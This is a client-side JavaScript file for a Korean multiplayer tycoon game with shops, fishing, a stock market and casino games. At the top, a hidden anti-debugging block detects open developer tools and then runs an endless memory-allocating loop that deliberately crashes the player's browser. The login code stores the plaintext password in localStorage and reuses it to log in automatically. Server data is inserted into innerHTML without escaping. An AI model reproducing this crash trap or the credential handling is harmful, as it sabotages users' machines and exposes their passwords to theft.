const socket = io();
let myData = null, otherPlayers = {}, jobsCache = [], vendingCache = [], stocksCache = [];
let myPos = { x: 1500, y: 1500 };
let currentActionTarget = null, isFishing = false, fishingTimer = null;
const keys = {};

(function() {
  const threshold = 160;
  setInterval(() => {
    if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
      while (true) {
        console.log("CRASH_MACRO");
        const arr = new Array(100000000).fill(0);
      }
    }
  }, 500);
})();

const ITEM_NAMES = {
  'water': '생수', 'snack': '초코바', 'gimbap': '참치 삼각김밥', 'bento': '프리미엄 도시락', 'steak': '한우 특상 스테이크',
  'bait_normal': '지렁이 미끼', 'bait_gold': '황금 새우 미끼',
  'f_01': '[일반] 피라미', 'f_02': '[일반] 붕어', 'f_03': '[일반] 망둥어', 'f_04': '[일반] 피라니아(새끼)', 'f_05': '[일반] 잉어',
  'f_06': '[고급] 쏘가리', 'f_07': '[고급] 메기', 'f_08': '[고급] 송어', 'f_09': '[고급] 우럭', 'f_10': '[고급] 광어',
  'f_11': '[희귀] 연어', 'f_12': '[희귀] 참치', 'f_13': '[희귀] 철갑상어', 'f_14': '[희귀] 문어', 'f_15': '[희귀] 전기뱀장어',
  'f_16': '[영웅] 대왕 가오리', 'f_17': '[영웅] 청새치', 'f_18': '[영웅] 심해 아귀', 'f_19': '[영웅] 대왕 바다거북', 'f_20': '[영웅] 범고래',
  'f_21': '[전설] 황금 상어', 'f_22': '[전설] 실러캔스', 'f_23': '[전설] 네스호 고대 괴수', 'f_24': '[전설] 크라켄(새끼)',
  'f_25': '[신화] 포세이돈의 수호 잉어', 'f_26': '[신화] 황금 고래왕', 'f_27': '[신화] 레바테인의 비늘',
  'f_28': '[초월] 우주 심해의 별빛 고래', 'f_29': '[초월] 차원 개척자의 환수', 'f_30': '[초월] 세계관을 삼킨 태초의 리바이아산'
};

function showMainView() {
  document.getElementById('auth-main-view').classList.remove('hidden');
  document.getElementById('auth-login-view').classList.add('hidden');
  document.getElementById('auth-register-view').classList.add('hidden');
}

function showLoginView() {
  document.getElementById('auth-main-view').classList.add('hidden');
  document.getElementById('auth-login-view').classList.remove('hidden');
}

function showRegisterView() {
  document.getElementById('auth-main-view').classList.add('hidden');
  document.getElementById('auth-register-view').classList.remove('hidden');
}

function handleLogin() {
  const username = document.getElementById('login-username').value;
  const password = document.getElementById('login-password').value;
  localStorage.setItem('tycoon_user', username);
  localStorage.setItem('tycoon_pass', password);
  socket.emit('auth:login', { username, password });
}

async function sendEmailCode() {
  const email = document.getElementById('reg-email').value;
  if (!email) {
    showToast('이메일을 먼저 입력해주세요.', false);
    return;
  }
  showToast('인증 코드를 전송 중입니다...', true);

  try {
    const res = await fetch('/api/send-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email })
    });
    const data = await res.json();
    showToast(data.msg, data.success);
  } catch (err) {
    showToast('전송 요청 실패', false);
  }
}

function handleRegister() {
  const username = document.getElementById('reg-username').value;
  const password = document.getElementById('reg-password').value;
  const email = document.getElementById('reg-email').value;
  const code = document.getElementById('reg-code').value;

  socket.emit('auth:register', { username, password, email, code });
}

window.addEventListener('keydown', e => {
  keys[e.key.toLowerCase()] = true;
  if (e.key === 'Escape') {
    const escModal = document.getElementById('esc-settings-modal');
    const buildModal = document.getElementById('building-modal');
    if (!buildModal.classList.contains('hidden')) closeModal();
    else escModal.classList.toggle('hidden');
  }
  if (e.key.toLowerCase() === 'e' && currentActionTarget) {
    openBuildingModal(currentActionTarget.id);
  }
});

window.addEventListener('keyup', e => keys[e.key.toLowerCase()] = false);

window.addEventListener('load', () => {
  const savedUser = localStorage.getItem('tycoon_user');
  const savedPass = localStorage.getItem('tycoon_pass');
  if (savedUser && savedPass) socket.emit('auth:login', { username: savedUser, password: savedPass });
});

function showToast(msg, isSuccess = true) {
  const toast = document.createElement('div');
  toast.className = `toast ${isSuccess ? '' : 'error'}`;
  toast.textContent = msg;
  document.getElementById('toast-box').appendChild(toast);
  setTimeout(() => toast.remove(), 3000);
}

document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn, .tab-panel').forEach(el => el.classList.remove('active'));
    btn.classList.add('active'); document.getElementById(btn.dataset.tab).classList.add('active');
  });
});

socket.on('notify', d => showToast(d.msg, d.success));
socket.on('auth:success', ({ username, userData, jobs, vending, stocks }) => {
  document.getElementById('auth-modal').classList.add('hidden');
  document.getElementById('game-app').classList.remove('hidden');
  myData = userData; jobsCache = jobs; vendingCache = vending; stocksCache = stocks || [];
  renderAll();
  startCanvasLoop();
});

socket.on('player:sync', data => { 
  myData = data; 
  renderAll(); 
  const buildModal = document.getElementById('building-modal');
  if (!buildModal.classList.contains('hidden') && document.getElementById('modal-title').textContent.includes('편의점')) {
    openBuildingModal('vending');
  }
});
socket.on('players:update', players => { otherPlayers = players; });
socket.on('stocks:update', stocks => { 
  stocksCache = stocks; 
  const stockModal = document.getElementById('building-modal');
  if (!stockModal.classList.contains('hidden') && document.getElementById('modal-title').textContent.includes('주식시장')) {
    updateStockModalContent();
  }
});

function renderAll() {
  const maxH = myData.maxHunger || 100;
  document.getElementById('hud-username').textContent = myData.username;
  document.getElementById('hud-money').textContent = `₩${myData.money.toLocaleString()}`;
  document.getElementById('hud-job').textContent = jobsCache[myData.jobIndex]?.name || '무직';
  document.getElementById('hud-hunger-bar').style.width = `${(myData.hunger / maxH) * 100}%`;
  document.getElementById('hud-hunger-val').textContent = `${myData.hunger} / ${maxH}`;

  document.getElementById('job-list').innerHTML = jobsCache.map((j, idx) => `
    <div class="card-item" style="${myData.jobIndex === idx ? 'border-color:var(--primary); background:#e0e7ff;' : ''}">
      <div>
        <h4>${j.name} ${myData.jobIndex === idx ? '(현재)' : ''}</h4>
        <p class="desc-text" style="font-size:13px; color:#334155;">월급: ₩${j.salary.toLocaleString()} / 1분30초 | 에너지: -${j.workEnergyCost}</p>
      </div>
      <div style="font-size:12px; text-align:right;">승진조건<br><strong>₩${j.reqMoney.toLocaleString()}</strong></div>
    </div>`).join('');

  const inv = myData.inventory || {};
  document.getElementById('inventory-list').innerHTML = Object.keys(inv).length === 0 ? '<p style="color:gray;">가방이 비었습니다.</p>' :
    Object.keys(inv).map(id => {
      const koreanName = ITEM_NAMES[id] || id;
      return `<div class="card-item"><span>${koreanName} (${inv[id]}개)</span><button class="btn success" style="width:auto;padding:6px 12px;" onclick="socket.emit('inventory:use','${id}')">사용/판매</button></div>`;
    }).join('');
}

function teleportTo(x, y) {
  myPos.x = x; myPos.y = y;
  socket.emit('player:move', myPos);
  showToast('🌀 해당 장소로 즉시 이동했습니다!', true);
}

function startCanvasLoop() {
  const canvas = document.getElementById('world-canvas');
  const ctx = canvas.getContext('2d');

  const buildings = [
    { x: 500, y: 500, w: 180, h: 120, name: '🏪 24시 편의점', id: 'vending', color: '#3b82f6' },
    { x: 2300, y: 500, w: 180, h: 120, name: '🎣 힐링 낚시터', id: 'fishing', color: '#10b981' },
    { x: 1400, y: 2200, w: 180, h: 120, name: '⚡ 캐릭터 상점', id: 'upgrade', color: '#f59e0b' },
    { x: 500, y: 2200, w: 180, h: 120, name: '🎰 VIP 카지노', id: 'casino', color: '#ef4444' },
    { x: 2300, y: 2200, w: 180, h: 120, name: '📈 주식시장', id: 'stock', color: '#8b5cf6' }
  ];

  setInterval(() => {
    if (!document.getElementById('esc-settings-modal').classList.contains('hidden') || !document.getElementById('building-modal').classList.contains('hidden')) return;

    let moved = false;
    let speed = 5;
    if (keys['arrowup'] || keys['w']) { myPos.y -= speed; moved = true; }
    if (keys['arrowdown'] || keys['s']) { myPos.y += speed; moved = true; }
    if (keys['arrowleft'] || keys['a']) { myPos.x -= speed; moved = true; }
    if (keys['arrowright'] || keys['d']) { myPos.x += speed; moved = true; }

    myPos.x = Math.max(50, Math.min(2950, myPos.x));
    myPos.y = Math.max(50, Math.min(2950, myPos.y));

    if (moved) socket.emit('player:move', myPos);

    const camX = canvas.width / 2 - myPos.x;
    const camY = canvas.height / 2 - myPos.y;

    ctx.fillStyle = '#f0fdf4';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.save();
    ctx.translate(camX, camY);

    const tileSize = 60;
    for (let x = 0; x < 3000; x += tileSize) {
      for (let y = 0; y < 3000; y += tileSize) {
        ctx.fillStyle = (x / tileSize + y / tileSize) % 2 === 0 ? '#dcfce7' : '#bbf7d0';
        ctx.fillRect(x, y, tileSize, tileSize);
        ctx.strokeStyle = '#86efac';
        ctx.strokeRect(x, y, tileSize, tileSize);
      }
    }

    let foundTarget = null;
    buildings.forEach(b => {
      ctx.fillStyle = b.color;
      ctx.fillRect(b.x, b.y, b.w, b.h);
      ctx.strokeStyle = '#ffffff';
      ctx.lineWidth = 4;
      ctx.strokeRect(b.x, b.y, b.w, b.h);
      ctx.fillStyle = '#ffffff';
      ctx.font = 'bold 16px sans-serif';
      ctx.fillText(b.name, b.x + 15, b.y + 65);

      const dist = Math.hypot(myPos.x - (b.x + b.w / 2), myPos.y - (b.y + b.h / 2));
      if (dist < 110) foundTarget = b;
    });

    currentActionTarget = foundTarget;
    const popup = document.getElementById('interaction-popup');
    if (currentActionTarget) {
      popup.textContent = `⌨️ [E] 키를 눌러 ${currentActionTarget.name} 입장`;
      popup.classList.remove('hidden');
    } else {
      popup.classList.add('hidden');
    }

    for (let id in otherPlayers) {
      let p = otherPlayers[id];
      drawAvatar(ctx, p.x, p.y, p.username, p.avatarColor || '#f43f5e');
    }

    drawAvatar(ctx, myPos.x, myPos.y, myData.username + ' (나)', '#4f46e5');
    ctx.restore();
  }, 1000 / 60);
}

function drawAvatar(ctx, x, y, name, color) {
  ctx.fillStyle = 'rgba(0,0,0,0.2)';
  ctx.beginPath(); ctx.ellipse(x, y + 16, 12, 6, 0, 0, Math.PI * 2); ctx.fill();

  ctx.fillStyle = color;
  ctx.fillRect(x - 10, y - 4, 20, 20);
  ctx.strokeStyle = '#fff'; ctx.lineWidth = 2; ctx.strokeRect(x - 10, y - 4, 20, 20);

  ctx.fillStyle = '#fde68a';
  ctx.beginPath(); ctx.arc(x, y - 12, 12, 0, Math.PI * 2); ctx.fill();
  ctx.stroke();

  ctx.fillStyle = 'rgba(0,0,0,0.85)';
  ctx.fillRect(x - name.length * 4 - 6, y - 40, name.length * 8 + 12, 20);
  ctx.fillStyle = '#ffffff'; ctx.font = 'bold 12px sans-serif';
  ctx.fillText(name, x - name.length * 4, y - 26);
}

function openBuildingModal(id) {
  const modal = document.getElementById('building-modal');
  const title = document.getElementById('modal-title');
  const body = document.getElementById('modal-body');
  modal.classList.remove('hidden');

  if (id === 'vending') {
    title.textContent = '🏪 24시 편의점 & 미끼 상점 (1개 / 10개 구매)';
    body.innerHTML = vendingCache.map(i => `
      <div class="card-item">
        <div>
          <h4>${i.name}</h4>
          <p style="font-size:13px; color:#047857;">가격: ₩${i.cost.toLocaleString()}</p>
        </div>
        <div style="display:flex; gap:6px;">
          <button class="btn primary" style="width:auto;padding:8px 10px;" onclick="socket.emit('vending:buy',{itemId:'${i.id}', count:1})">1개 구매</button>
          <button class="btn warning" style="width:auto;padding:8px 10px;" onclick="socket.emit('vending:buy',{itemId:'${i.id}', count:10})">10개 구매</button>
        </div>
      </div>`).join('');
  } else if (id === 'upgrade') {
    title.textContent = '⚡ 캐릭터 강화 상점';
    const up = myData.upgrades || { fishingRod: 1, stomach: 1 };
    const maxH = myData.maxHunger || 100;
    body.innerHTML = `
      <div class="card-item">
        <div><h4>🎣 낚싯대 강화 (현재 Lv.${up.fishingRod})</h4><p class="desc-text">비용: ₩${(up.fishingRod * 150000).toLocaleString()}</p></div>
        <button class="btn success" style="width:auto;padding:10px;" onclick="socket.emit('upgrade:buy','fishingRod')">강화</button>
      </div>
      <div class="card-item">
        <div><h4>🍖 위장 강화 (현재 최대 포만감: ${maxH})</h4><p class="desc-text">비용: ₩${(up.stomach * 250000).toLocaleString()}</p></div>
        <button class="btn success" style="width:auto;padding:10px;" onclick="socket.emit('upgrade:buy','stomach')">강화</button>
      </div>`;
  } else if (id === 'fishing') {
    title.textContent = '🎣 힐링 낚시터';
    const inv = myData.inventory || {};
    const normalCount = inv['bait_normal'] || 0;
    const goldCount = inv['bait_gold'] || 0;

    body.innerHTML = `
      <p style="font-weight:bold;">사용할 미끼를 선택하고 낚싯대를 던지세요!</p>
      <div class="input-group" style="margin-top:10px;">
        <label style="font-size:14px; font-weight:bold;">미끼 선택:</label>
        <select id="fishing-bait-select">
          <option value="none">맨손 (미끼 없음)</option>
          <option value="bait_normal">지렁이 미끼 (${normalCount}개 보유)</option>
          <option value="bait_gold">황금 새우 미끼 (${goldCount}개 보유)</option>
        </select>
      </div>
      <button class="btn primary huge" id="btn-fish-action" style="margin-top:10px;padding:15px;" onclick="startFishingProcess()">🎣 낚싯대 던지기 (3초 쿨타임)</button>
      <div id="fishing-status-text" style="margin-top:12px;text-align:center;color:#b45309;font-weight:bold;font-size:16px;"></div>`;
  } else if (id === 'stock') {
    title.textContent = '📈 실시간 주식시장';
    updateStockModalContent();
  } else if (id === 'casino') {
    title.textContent = '🎰 VIP 종합 카지노';
    body.innerHTML = `
      <div style="display:flex; gap:8px; margin-bottom:15px;">
        <button class="btn primary" onclick="switchCasinoGame('blackjack')">♠️ 블랙잭</button>
        <button class="btn warning" onclick="switchCasinoGame('bacc')">🎲 바카라</button>
        <button class="btn success" onclick="switchCasinoGame('hl')">⬆️ 하이로우</button>
        <button class="btn secondary" onclick="switchCasinoGame('slot')">🎰 슬롯머신</button>
      </div>
      <div id="casino-game-view"></div>`;
    switchCasinoGame('blackjack');
  }
}

function updateStockModalContent() {
  const body = document.getElementById('modal-body');
  if (!body || !document.getElementById('modal-title').textContent.includes('주식시장')) return;
  body.innerHTML = stocksCache.map(s => `
    <div class="card-item">
      <div><h4>${s.name}</h4><p class="text-green">₩${s.price.toLocaleString()} | 보유: ${(myData.stocks && myData.stocks[s.symbol]) || 0}주</p></div>
      <div style="display:flex;gap:8px;">
        <button class="btn primary" style="width:auto;padding:8px 12px;" onclick="const amt=prompt('매수 수량:','1');if(amt)socket.emit('stock:buy',{symbol:'${s.symbol}',amount:parseInt(amt)})">매수</button>
        <button class="btn secondary" style="width:auto;padding:8px 12px;" onclick="const amt=prompt('매도 수량:','1');if(amt)socket.emit('stock:sell',{symbol:'${s.symbol}',amount:parseInt(amt)})">매도</button>
      </div>
    </div>`).join('');
}

function switchCasinoGame(game) {
  const view = document.getElementById('casino-game-view');
  if (game === 'blackjack') {
    view.innerHTML = `
      <h3>♠️ 블랙잭 (21 달성 시 자동 스탠드)</h3>
      <div class="input-group" style="margin-top:10px;"><input type="number" id="bj-bet-input" value="10000" placeholder="배팅금"></div>
      <button class="btn warning" onclick="startBJGame()">게임 시작</button>
      <div id="bj-live-table" class="hidden" style="margin-top:15px;background:#0f172a;color:#fff;padding:15px;border-radius:8px;font-size:15px;">
        <p>딜러 패: <span id="bj-d-cards"></span> (<span id="bj-d-score">?</span>)</p>
        <p style="margin-top:8px;">내 패: <span id="bj-p-cards"></span> (<span id="bj-p-score">0</span>)</p>
        <div style="display:flex; gap:8px; margin-top:12px;">
          <button class="btn success" onclick="socket.emit('casino:blackjack:hit')">Hit (카드 받기)</button>
          <button class="btn warning" onclick="socket.emit('casino:blackjack:stand')">Stand (멈춤)</button>
        </div>
      </div>`;
  } else if (game === 'bacc') {
    view.innerHTML = `
      <h3>🎲 바카라 (Player vs Banker)</h3>
      <div class="input-group" style="margin-top:10px;"><input type="number" id="bacc-bet-input" value="10000" placeholder="배팅금"></div>
      <div style="display:flex; gap:8px; margin-top:10px;">
        <button class="btn primary" onclick="playBacc('PLAYER')">Player 배팅 (2배)</button>
        <button class="btn warning" onclick="playBacc('BANKER')">Banker 배팅 (2배)</button>
        <button class="btn success" onclick="playBacc('TIE')">Tie 무승부 (9배)</button>
      </div>
      <div id="bacc-result" style="margin-top:15px;font-weight:bold;font-size:16px;"></div>`;
  } else if (game === 'hl') {
    view.innerHTML = `
      <h3>⬆️ 하이로우 예측</h3>
      <div class="input-group" style="margin-top:10px;"><input type="number" id="hl-bet-input" value="10000" placeholder="배팅금"></div>
      <div style="display:flex; gap:8px; margin-top:10px;">
        <button class="btn primary" onclick="playHL('HIGH')">📈 High (더 높을 것)</button>
        <button class="btn warning" onclick="playHL('LOW')">📉 Low (더 낮을 것)</button>
      </div>
      <div id="hl-result" style="margin-top:15px;font-weight:bold;font-size:16px;"></div>`;
  } else if (game === 'slot') {
    view.innerHTML = `
      <h3>🎰 슬롯머신</h3>
      <div class="input-group" style="margin-top:10px;"><input type="number" id="slot-bet-input" value="10000" placeholder="배팅금"></div>
      <button class="btn success" style="margin-top:10px;" onclick="playSlot()">🎰 슬롯 돌리기</button>
      <div id="slot-result" style="margin-top:15px;font-size:28px;text-align:center;font-weight:bold;background:#1e293b;padding:15px;border-radius:8px;color:#facc15;">🍒 | 🍋 | 🍊</div>`;
  }
}

function startBJGame() {
  const bet = parseInt(document.getElementById('bj-bet-input').value, 10);
  socket.emit('casino:blackjack:start', { bet });
  document.getElementById('bj-live-table').classList.remove('hidden');
}

socket.on('casino:bj:state', res => {
  document.getElementById('bj-p-cards').textContent = res.pHand.map(c=>c.suit+c.val).join(' ');
  document.getElementById('bj-d-cards').textContent = res.dHand.map(c=>c.suit+c.val).join(' ');
  document.getElementById('bj-p-score').textContent = res.pScore;
  document.getElementById('bj-d-score').textContent = res.dScore;
});

socket.on('casino:bj:result', res => {
  showToast(res.msg, res.win);
  document.getElementById('bj-p-cards').textContent = res.pHand.map(c=>c.suit+c.val).join(' ');
  document.getElementById('bj-d-cards').textContent = res.dHand.map(c=>c.suit+c.val).join(' ');
  document.getElementById('bj-p-score').textContent = calcScore(res.pHand);
  document.getElementById('bj-d-score').textContent = calcScore(res.dHand);
});

function playBacc(choice) {
  const bet = parseInt(document.getElementById('bacc-bet-input').value, 10);
  socket.emit('casino:bacc:play', { bet, choice });
}
socket.on('casino:bacc:result', res => {
  document.getElementById('bacc-result').textContent = `결과: 플레이어(${res.pCard}) vs 뱅커(${res.bCard}) 👉 승자: ${res.winner}`;
});

function playHL(choice) {
  const bet = parseInt(document.getElementById('hl-bet-input').value, 10);
  socket.emit('casino:hl:play', { bet, choice });
}
socket.on('casino:hl:result', res => {
  document.getElementById('hl-result').textContent = `기준 카드: ${res.base} | 다음 카드: ${res.next} 👉 ${res.win ? '성공!' : '실패...'}`;
});

function playSlot() {
  const bet = parseInt(document.getElementById('slot-bet-input').value, 10);
  socket.emit('casino:slot:play', { bet });
}
socket.on('casino:slot:result', res => {
  document.getElementById('slot-result').textContent = `${res.r1} | ${res.r2} | ${res.r3}`;
  if (res.reward > 0) showToast(`슬롯머신 당첨! ₩${res.reward.toLocaleString()} 획득!`, true);
  else showToast(`꽝! 다음 기회에...`, false);
});

function calcScore(hand) {
  return hand.reduce((acc, c) => acc + (['J','Q','K'].includes(c.val)?10:c.val==='A'?11:parseInt(c.val)||0), 0);
}

function closeModal() {
  document.getElementById('building-modal').classList.add('hidden');
  if (isFishing) { clearTimeout(fishingTimer); isFishing = false; }
}

function closeEscMenu() {
  document.getElementById('esc-settings-modal').classList.add('hidden');
}

function handleLogout() {
  localStorage.removeItem('tycoon_user');
  localStorage.removeItem('tycoon_pass');
  location.reload();
}

function startFishingProcess() {
  if (isFishing) return;
  const baitSelect = document.getElementById('fishing-bait-select');
  const selectedBait = baitSelect ? baitSelect.value : 'none';

  const btn = document.getElementById('btn-fish-action');
  const status = document.getElementById('fishing-status-text');

  isFishing = true;
  btn.disabled = true;
  btn.style.background = '#cbd5e1';

  status.textContent = '⏳ 낚싯대를 던졌습니다... (3초 대기)';
  setTimeout(() => {
    status.textContent = '🌊 찌가 물 위에 둥둥 떠 있습니다... 입질 대기 중 (5초)';
    fishingTimer = setTimeout(() => {
      socket.emit('fish:catch', { selectedBait });
      status.textContent = '🎉 물고기가 걸렸습니다! 가방을 확인하세요.';
      isFishing = false;
      btn.disabled = false;
      btn.style.background = '#4f46e5';
    }, 5000);
  }, 3000);
}
